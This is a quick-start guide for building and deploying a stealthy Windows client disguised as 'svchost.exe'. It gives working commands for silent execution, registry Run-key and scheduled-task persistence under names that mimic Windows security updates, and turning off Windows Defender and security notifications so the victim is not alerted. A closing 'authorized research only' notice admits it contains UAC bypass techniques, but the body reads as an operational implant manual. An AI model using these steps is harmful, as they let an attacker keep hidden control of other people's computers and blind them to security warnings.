# Quick Start Guide - svchost.exe

## Summary of All Features

### 1. ✅ Silent Execution (No Console Window)
- Configured in `svchost.spec`: `console=False`
- No popup windows when running

### 2. ✅ No UAC Prompts on Startup
- Fixed persistence mechanisms to use normal user privileges
- Registry: Uses `HKEY_CURRENT_USER` (no admin)
- Scheduled Tasks: Uses `/RL LIMITED` (no admin)

### 3. ✅ Automatic Notification Disable
- **NEW FEATURE**: Disables all Windows notifications on first run
- Executes BEFORE any other initialization
- Covers 7 types of notifications

## Build Instructions

```powershell
# 1. Install dependencies (if not already installed)
pip install -r requirements-client.txt pyinstaller

# 2. Build the executable
pyinstaller svchost.spec --clean --noconfirm

# 3. Your executable is ready
# Location: dist\svchost.exe
```

## First Time Setup

### Step 1: Clean Up Old Entries (If Any)
```powershell
# Remove old persistence entries
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "svchost32" /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /f
schtasks /delete /tn "WindowsSecurityUpdate" /f
schtasks /delete /tn "WindowsSecurityUpdateTask" /f
```

### Step 2: Run Once with Admin
```powershell
# Right-click dist\svchost.exe → "Run as administrator"
# This sets up persistence and disables notifications
```

### Step 3: Restart and Verify
```powershell
# Restart your computer
# The program should:
# - Start automatically
# - Show NO UAC prompt
# - Show NO notifications
# - Run silently (no console window)
```

## Verification Commands

### Check if executable is running:
```powershell
tasklist | findstr svchost.exe
```

### Check persistence entries:
```powershell
# Check registry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "svchost32"

# Check scheduled task
schtasks /query /tn "WindowsSecurityUpdateTask" /fo list /v
```

### Check notification settings:
```powershell
# Check if notifications are disabled
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled
reg query "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter
```

## What Happens on First Run

```
1. [STARTUP] Disabling Windows notifications...
   └─ Disables Action Center
   └─ Disables Notification Center
   └─ Disables Windows Defender notifications
   └─ Disables Toast notifications
   └─ Disables Windows Update notifications
   └─ Disables Security notifications

2. Initialize stealth mode

3. Set up persistence (registry + scheduled task)
   └─ Uses normal user privileges (no UAC)
   └─ Silent execution (no console)

4. Start agent operations
```

## Expected Behavior

### ✅ CORRECT Behavior:
- Starts automatically after reboot
- No UAC prompt
- No console window
- No notifications
- Runs silently in background

### ❌ INCORRECT Behavior (Old Version):
- UAC prompt on every startup ← **FIXED**
- Notifications popup ← **FIXED**
- Console window appears ← **FIXED**

## Troubleshooting

### Problem: UAC prompt still appears
**Solution:**
```powershell
# Check scheduled task run level
schtasks /query /tn "WindowsSecurityUpdateTask" /fo list /v | findstr "Run Level"
# Should show: "Run Level: Limited"

# If it shows "Highest", delete and rebuild:
schtasks /delete /tn "WindowsSecurityUpdateTask" /f
# Then run svchost.exe again with admin once
```

### Problem: Notifications still appear
**Solution:**
```powershell
# Manually disable notifications
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications" /v ToastEnabled /t REG_DWORD /d 0 /f
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f

# Then restart explorer.exe
taskkill /f /im explorer.exe
start explorer.exe
```

### Problem: Console window appears
**Solution:**
```powershell
# Rebuild with correct spec file
pyinstaller svchost.spec --clean --noconfirm
# Make sure svchost.spec has: console=False
```

## File Locations

### Executable:
```
dist\svchost.exe
```

### Config Files:
```
svchost.spec           - PyInstaller configuration
client.py              - Source code
requirements-client.txt - Dependencies
```

### Documentation:
```
BUILD_INSTRUCTIONS.md           - How to build on Windows
UAC_FIX_SUMMARY.md             - UAC prompt fix details
NOTIFICATION_DISABLE_FEATURE.md - Notification disable details
QUICK_START.md                 - This file
```

## Testing Checklist

- [ ] Built executable with PyInstaller
- [ ] Cleaned up old persistence entries
- [ ] Ran once with admin privileges
- [ ] Restarted computer
- [ ] Verified no UAC prompt on startup
- [ ] Verified no console window appears
- [ ] Verified no notifications appear
- [ ] Verified executable is running (tasklist)
- [ ] Verified persistence entries exist (registry/task)

## Advanced: Manual Persistence Setup

If automatic setup fails, you can manually create persistence:

### Registry Method:
```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "svchost32" /t REG_SZ /d "C:\Path\To\svchost.exe" /f
```

### Scheduled Task Method:
```powershell
schtasks /create /tn "SystemUpdate" /tr "C:\Path\To\svchost.exe" /sc onlogon /rl limited /f
```

## Support

For issues or questions:
1. Check the detailed documentation files
2. Review the log output (if DEBUG_MODE enabled in client.py)
3. Verify all prerequisite steps completed

## Security Notice

⚠️ **For Authorized Research Only**
- This tool is for security research on systems you own
- Test only in authorized environments
- Contains UAC bypass techniques for research purposes
- Use responsibly and ethically
